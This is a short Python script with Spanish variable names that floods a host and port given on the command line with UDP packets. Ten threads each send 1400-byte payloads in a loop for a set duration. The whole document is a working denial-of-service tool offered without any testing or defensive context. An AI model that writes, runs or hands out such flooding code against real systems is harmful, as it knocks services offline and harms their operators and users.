import socket
import sys
import time
import threading

host = sys.argv[1]
puerto = int(sys.argv[2])
duracion = int(sys.argv[3])
tiempo = time.time() + duracion
payload = b"A" * 1400  # Payload grande

def flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < tiempo:
        s.sendto(payload, (host, puerto))

hilos = []
for _ in range(10):  # Número de hilos
    t = threading.Thread(target=flood)
    t.start()
    hilos.append(t)

for t in hilos:
    t.join()
print("Envío terminado.")
